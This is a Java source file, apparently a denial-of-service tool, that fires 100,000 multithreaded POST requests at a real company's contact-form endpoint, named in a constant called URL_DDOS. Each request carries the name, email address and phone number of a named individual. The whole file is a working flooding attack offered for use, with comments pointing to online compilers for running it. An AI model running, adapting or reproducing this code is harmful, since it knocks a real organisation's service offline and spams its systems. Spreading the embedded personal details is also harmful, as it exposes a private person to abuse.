import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainPostSiteDown {

    //java online compiler
    //https://repl.it/languages/java10
    //https://www.tutorialspoint.com/compile_java_online.php
    //https://www.mycompiler.io/new/java

    private static final String URL_DDOS = "https://cloud.email.natera.com/2020_Contact_us/smartcapture/post";
    private static final String POST_PARAMS = "targetID=23D83F9E-C778-4549-8CC3-ED16996A7C70&targetType=dataExtension&attributes={\"First Name\":\"Ekaterina\",\"Last Name\":\"Gureeva\",\"EmailAddress2\":\"ekaterina@exemter.com\",\"Phone\":\"+7 499 322-94-48\",\"Country\":\"Russia\",\"What would you like help with\":\"\",\"Do you have any comments for our team\":\"\",\"Email\":\"support%40natera.com\"}";
    private static final int NUMBER_OF_THREADS = Runtime.getRuntime().availableProcessors();

    private static boolean error = false;
    private static int requestCount = 100000;


    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(NUMBER_OF_THREADS);
        while (requestCount > 0 && !error) {
            executorService.submit(new DDosnRunnable());
            requestCount--;
        }
        executorService.shutdown();
    }

    static class DDosnRunnable implements Runnable {

        @Override
        public void run() {
            try {
                HttpURLConnection connection = (HttpURLConnection) new URL(URL_DDOS).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                OutputStream os = connection.getOutputStream();
                os.write(POST_PARAMS.getBytes());
                os.flush();
                os.close();

                InputStream is = connection.getInputStream();
                byte[] bytes = new byte[is.available()];
                is.read(bytes);
                System.out.println(URL_DDOS + " " + new String(bytes, StandardCharsets.UTF_8));
                is.close();
                connection.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                error = true;
            }
        }
    }
}